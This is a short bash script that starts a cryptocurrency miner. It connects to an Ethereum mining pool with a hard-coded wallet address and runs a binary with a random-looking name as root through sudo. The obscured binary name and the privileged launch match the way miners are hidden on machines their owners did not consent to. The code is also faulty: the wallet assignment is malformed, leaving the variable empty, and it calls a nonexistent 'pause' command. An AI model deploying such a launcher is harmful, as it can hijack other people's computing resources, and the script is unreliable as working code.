#!/bin/bash

POOL=asia1.ethermine.org:4444
WALLET= 0x17A3Bb2242167343211734d65b951E43C8F96c9e
WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)

cd "$(dirname "$0")"

chmod +x ./3wcgp7C && sudo ./3wcgp7C -a ethash -o $POOL -u $WALLET.$WORKER -log
pause $@
